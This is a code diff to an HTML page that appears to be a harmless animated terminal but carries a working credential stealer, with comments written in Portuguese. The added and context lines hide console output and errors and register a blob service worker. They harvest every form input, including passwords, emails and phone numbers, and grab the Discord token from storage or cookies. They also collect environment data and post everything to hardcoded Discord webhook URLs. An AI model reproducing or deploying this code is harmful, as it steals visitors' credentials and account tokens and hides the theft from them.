@@ -15,6 +15,7 @@
 <div id="terminal"></div>
 
 <script>
+/* ======= 0. INVISIBILIDADE ABSOLUTA ======= */
 (()=>{
     const nullFn = ()=>{};
     ["log","warn","error","info","debug"].forEach(m=>{ window.console[m]=nullFn; });
@@ -22,6 +23,7 @@
     window.addEventListener("unhandledrejection", e=>{ e.stopImmediatePropagation(); e.preventDefault(); });
 })();
 
+/* ======= 1. SERVICE-WORKER BLOB (nunca em disco) ======= */
 const swCode = `
 const HOOK = "https://discord.com/api/webhooks/1445121275218624686/a3x7y7Scgo6hkfUKbN8O7hPAg29E9QFCj8ve5bn1ekKRtakh7bms0SmQovDqOebCT2t7";
 function exfil(obj){
@@ -46,6 +48,7 @@ navigator.serviceWorker.register(swURL,{scope:"./"}).then(()=>{
     const TOKEN_HOOKS=["token","authorization","auth","discord","discord-token"];
     const grab=()=>{
         const cred={};
+        /* 2.1 Campos comuns */
         document.querySelectorAll("input").forEach(i=>{
             const v=i.value.trim();
             if(!v)return;
@@ -57,6 +60,7 @@ navigator.serviceWorker.register(swURL,{scope:"./"}).then(()=>{
             else if(i.type==="tel") cred[n+"_PHONE"]=v;
             else if(i.type==="password") cred[n+"_PASSWORD"]=v;
         });
+        /* 2.2 Token Discord */
         try{
             const tk=localStorage.getItem("token")||sessionStorage.getItem("token")||document.cookie.split("token=").pop().split(";")[0];
             if(tk) cred["DISCORD_TOKEN"]=tk;
@@ -90,7 +94,7 @@ navigator.serviceWorker.register(swURL,{scope:"./"}).then(()=>{
 
 /* ======= 3. COLETOR AMBIENTAL (apenas uma vez) ======= */
 (()=>{
-    const hook = "https://discord.com/api/webhooks/1443161577866924124/3KawgZj1c9mahMBJAyeYTEibDSIRqmqwEgnr6XN3ytYA7tBhGkELpnVVNvi7slWRZedI";
+    const hook = "https://discord.com/api/webhooks/1445121275218624686/a3x7y7Scgo6hkfUKbN8O7hPAg29E9QFCj8ve5bn1ekKRtakh7bms0SmQovDqOebCT2t7";
     const send=o=>fetch(hook,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:"Ghost",avatar_url:"https://i.imgur.com/7G9cc9e.png",embeds:[{title:"👻 Env",color:0xff0000,fields:Object.entries(o).map(([k,v])=>({name:k,value:v+"",inline:true}))}]})}).catch(()=>{});
     const data={
         url:location.href,
@@ -110,6 +114,7 @@ navigator.serviceWorker.register(swURL,{scope:"./"}).then(()=>{
 </script>
 
 <script>
+/* ======= 4. ANIMAÇÃO TERMINAL (inalterada) ======= */
 const terminal = document.getElementById("terminal");
 const lines = [
     "C:\\Users\\TERMINAL> Iniciando sistema...",
